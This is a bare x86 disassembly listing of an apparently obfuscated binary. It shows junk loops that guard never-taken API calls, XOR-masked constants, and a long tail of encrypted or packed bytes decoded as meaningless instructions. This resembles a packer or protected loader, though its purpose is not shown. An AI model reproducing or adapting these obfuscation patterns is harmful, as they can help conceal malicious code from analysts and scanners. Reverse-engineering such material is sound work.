  41c44f:	dec    ecx
  41c450:	mov    DWORD PTR ds:0x42c018,ecx
  41c456:	jmp    0x41c421
  41c45b:	sub    DWORD PTR ds:0x428014,0x2577
  41c465:	mov    ecx,0x3b4b
  41c46a:	xor    DWORD PTR ds:0x42b00c,0x43e8
  41c474:	add    ax,cx
  41c477:	mov    DWORD PTR ds:0x429004,0x1e
  41c481:	cmp    DWORD PTR ds:0x429004,0x0
  41c488:	je     0x41c4e7
  41c48e:	cmp    DWORD PTR ds:0x429004,0x2c
  41c495:	jne    0x41c4c5
  41c49b:	push   0x42c000
  41c4a0:	push   0x3d75
  41c4a5:	push   DWORD PTR [ebp-0x20]
  41c4a8:	push   0x42c004
  41c4ad:	push   DWORD PTR [ebp-0xc]
  41c4b0:	push   0x423822
  41c4b5:	push   0x75d0
  41c4ba:	push   0x7026
  41c4bf:	call   DWORD PTR ds:0x424024
  41c4c5:	xor    ecx,ecx
  41c4c7:	add    ecx,DWORD PTR ds:0x429004
  41c4cd:	dec    ecx
  41c4ce:	mov    DWORD PTR ds:0x429004,ecx
  41c4d4:	jmp    0x41c481
  41c4d9:	mov    ecx,DWORD PTR ds:0x421a46
  41c4df:	mov    ecx,DWORD PTR [ecx]
  41c4e1:	and    DWORD PTR ds:0x428024,ecx
  41c4e7:	movzx  eax,ax
  41c4ea:	xor    DWORD PTR ds:0x42a004,0x42801c
  41c4f4:	mov    DWORD PTR [ebp-0x18],eax
  41c4f7:	and    DWORD PTR ds:0x42801c,0x7f28
  41c501:	mov    BYTE PTR [ebp-0x1],0x61
  41c505:	xor    ecx,0x4092
  41c50b:	lea    eax,[ebp-0x1]
  41c50e:	sub    DWORD PTR ds:0x429008,0x31e1
  41c518:	mov    DWORD PTR [ebp-0x10],eax
  41c51b:	add    ecx,DWORD PTR ds:0x428010
  41c521:	mov    al,BYTE PTR [ebp-0x1]
  41c524:	and    ecx,0x7ba8
  41c52a:	mov    ecx,DWORD PTR [ebp-0x10]
  41c52d:	xor    al,0x6f
  41c52f:	and    DWORD PTR ds:0x428008,0x42b018
  41c539:	sub    al,0xd
  41c53b:	adc    DWORD PTR ds:0x428018,0x42b008
  41c545:	mov    BYTE PTR [ecx],al
  41c547:	add    DWORD PTR ds:0x42a01c,ecx
  41c54d:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423978
  41c5ea:	push   0x4238dd
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423953
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42393e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a74
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0xd1d7ebdc
  41ccad:	xchg   ecx,eax
  41ccae:	mov    bl,0x98
  41ccb0:	xchg   edi,eax
  41ccb1:	cld    
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx+0x3e]
  41ccb9:	xchg   al,bh
  41ccbb:	ret    0x1d24
  41ccbe:	cmp    BYTE PTR [eax-0x300bd1f4],0x72
  41ccc5:	lea    eax,[edi+0x8]
  41ccc8:	out    0x7d,eax
  41ccca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cccb:	pop    ecx
  41cccc:	lods   al,BYTE PTR ds:[esi]
  41cccd:	ins    BYTE PTR es:[edi],dx
  41ccce:	jle    0x41cc9d
  41ccd0:	bound  ebp,QWORD PTR [eax-0x3b69daf6]
  41ccd6:	icebp  
  41ccd7:	xchg   ebp,eax
  41ccd8:	fild   DWORD PTR [edi]
  41ccda:	mov    ecx,DWORD PTR [edi+0x4d4a3add]
  41cce0:	dec    edx
  41cce1:	(bad)  
  41cce3:	xor    al,0xd1
  41cce5:	mov    edx,DWORD PTR [ecx]
  41cce7:	mul    BYTE PTR [ecx+0x5049b7b2]
  41cced:	and    edi,edi
  41ccef:	popa   
  41ccf0:	xchg   BYTE PTR [ebp+0x654b1578],ah
  41ccf6:	bound  edx,QWORD PTR [ebx+0x37]
  41ccf9:	imul   dh
  41ccfb:	mov    dh,0xb3
  41ccfd:	outs   dx,DWORD PTR ds:[esi]
  41ccfe:	cmp    al,0xc5
  41cd00:	sub    ebx,DWORD PTR [ebx+0x3cd17123]
  41cd06:	pop    ebp
  41cd07:	ret    
  41cd08:	and    al,0x98
  41cd0a:	pop    esi
  41cd0b:	mov    ah,0x85
  41cd0d:	div    DWORD PTR [ecx-0x54]
  41cd10:	(bad)  [edi+0x7]
  41cd13:	mov    esi,0xb662eb76
  41cd18:	adc    ah,BYTE PTR [edx+0x7e]
  41cd1b:	jp     0x41ccda
  41cd1d:	cmp    BYTE PTR [esi],dh
  41cd1f:	leave  
  41cd20:	pop    esi
  41cd21:	sbb    al,BYTE PTR [edi-0x3c]
  41cd24:	sar    BYTE PTR [ecx-0x47],cl
  41cd27:	dec    ecx
  41cd28:	ds fwait
  41cd2a:	loop   0x41cd9d
  41cd2c:	das    
  41cd2d:	loop   0x41cd4d
  41cd2f:	adc    BYTE PTR [eax],bl
  41cd31:	pop    eax
  41cd32:	jnp    0x41cd03
  41cd34:	jo     0x41cd8c
  41cd36:	nop
  41cd37:	pop    edi
  41cd38:	or     eax,DWORD PTR [esi-0x2f669573]
  41cd3e:	adc    ah,BYTE PTR [ebp+0x3373095f]
  41cd44:	adc    al,0x68
  41cd46:	mov    eax,0xc635257a
  41cd4b:	mov    dh,BYTE PTR [edi]
  41cd4d:	and    DWORD PTR [esi+0x32],ebp
  41cd50:	mov    bh,0x9f
  41cd52:	das    
  41cd53:	nop
  41cd54:	les    ebp,FWORD PTR [ebp+0x61]
  41cd57:	shl    DWORD PTR [edx-0x26d70e7b],1
  41cd5d:	test   al,0xbb
  41cd5f:	push   esp
  41cd60:	adc    cl,bh
  41cd62:	and    al,0x82
  41cd64:	aam    0x99
  41cd66:	xor    al,0x9a
  41cd68:	stos   DWORD PTR es:[edi],eax
  41cd69:	jge    0x41ccfe
  41cd6b:	sbb    al,0xc0
  41cd6d:	sub    edi,DWORD PTR [edx+0x61]
  41cd70:	lds    edx,FWORD PTR [ebp+0x5b1022dc]
  41cd76:	test   ebx,eax
  41cd78:	add    DWORD PTR [ecx+ebp*1+0x7a],0xcac31a44
  41cd80:	sub    al,0xcb
  41cd82:	jne    0x41cd98
  41cd84:	jmp    0x355ef0f9
  41cd89:	imul   eax,DWORD PTR [esi+ebp*8+0x4c052fe4],0xc80893be
  41cd94:	pop    ds
  41cd95:	outs   dx,DWORD PTR ds:[esi]
  41cd96:	pop    ecx
  41cd97:	inc    edi
  41cd98:	add    DWORD PTR [ecx+0x6664754a],ecx
  41cd9e:	mov    edx,0xaad4c470
  41cda3:	adc    DWORD PTR ds:0x8864faed,ebx
  41cda9:	inc    ebx
  41cdaa:	sub    eax,0xe2e9d338
  41cdaf:	sbb    ah,BYTE PTR [ebp+0x60]
  41cdb2:	test   DWORD PTR [ebx+0x54],ecx
  41cdb5:	adc    al,0xe1
  41cdb7:	adc    eax,0x7c2ae0a9
  41cdbc:	arpl   WORD PTR [eax+0x6a8b54ee],bx
  41cdc2:	mov    al,0x83
  41cdc4:	push   esp
  41cdc5:	jmp    0x238f680b
  41cdca:	jmp    0xe9c5:0xc18c951c
  41cdd1:	mov    dh,0x3f
  41cdd3:	pop    edi
  41cdd4:	dec    ebp
  41cdd5:	das    
  41cdd6:	add    ebp,edx
  41cdd8:	sbb    al,0xdf
  41cdda:	rcl    BYTE PTR [esi-0x3ae1253c],cl
  41cde0:	sahf   
  41cde1:	mov    dh,0x7c
  41cde3:	cmp    DWORD PTR [ebx-0x7a],ecx
  41cde6:	or     dh,BYTE PTR [ebx]
  41cde8:	mov    ah,BYTE PTR [ebx-0x33f97fdc]
  41cdee:	test   dl,cl
  41cdf0:	adc    edx,ebx
  41cdf2:	mov    gs,WORD PTR [ecx+0x36]
  41cdf5:	(bad)  
  41cdf7:	into   
  41cdf8:	cmp    ah,BYTE PTR [ebx]
  41cdfa:	jbe    0x41ce63
  41cdfc:	std    
  41cdfd:	adc    al,0xa6
  41cdff:	inc    ebx
  41ce00:	mov    esi,0x8256330c
  41ce05:	jl     0x41ce39
  41ce07:	cmp    dl,bl
  41ce09:	(bad)  
  41ce0a:	push   edx
  41ce0b:	and    BYTE PTR [ecx],bh
  41ce0d:	out    0x51,eax
  41ce0f:	xchg   BYTE PTR [ecx-0x60],bh
  41ce12:	pop    ss
  41ce13:	jmp    0x16f19011
  41ce18:	pop    ecx
  41ce19:	scas   al,BYTE PTR es:[edi]
  41ce1a:	ror    dh,0x29
  41ce1d:	int3   
  41ce1e:	dec    esi
  41ce1f:	(bad)
  41ce23:	(bad)  
  41ce24:	jecxz  0x41cdb9
  41ce26:	icebp  
  41ce27:	xchg   esp,eax
  41ce28:	xor    bh,BYTE PTR [ebp+0x5298190d]
  41ce2e:	xchg   esp,eax
  41ce2f:	or     eax,0xbb3f869
  41ce34:	dec    edx
  41ce35:	or     al,0xdb
  41ce37:	adc    BYTE PTR [edi],bl
  41ce39:	arpl   ax,di
  41ce3b:	into   
  41ce3c:	in     al,dx
  41ce3d:	add    BYTE PTR [esi+0x79ddec9b],al
  41ce43:	imul   esi,ecx,0x6e
  41ce46:	cmp    eax,0x9c72c3ba
  41ce4b:	mov    esp,0x4599a74b
  41ce50:	xchg   edi,eax
  41ce51:	js     0x41cea8
  41ce53:	jmp    0x41ce7d
  41ce55:	adc    DWORD PTR ds:0xdc78ff01,ebp
  41ce5b:	xchg   DWORD PTR [edx+esi*4-0x46f23af],esp
  41ce62:	jmp    0x41ceb1
  41ce64:	ds mov esp,ecx
  41ce67:	es push cs
  41ce69:	out    dx,eax
  41ce6a:	test   BYTE PTR ss:[ebp-0x61],al
  41ce6e:	sub    bl,bh
  41ce70:	pop    edi
  41ce71:	sub    eax,0xc7213c4d
  41ce76:	xor    BYTE PTR [ebx+0x12],0xe3
  41ce7a:	add    ch,bh
  41ce7c:	sbb    dl,ch
  41ce7e:	pop    ecx
  41ce7f:	pop    ds
  41ce80:	aaa    
  41ce81:	shr    DWORD PTR [edi+edi*2],cl
  41ce84:	in     eax,dx
  41ce85:	loope  0x41cea1
  41ce87:	sub    eax,0x694424c2
  41ce8c:	add    bh,BYTE PTR [ebx]
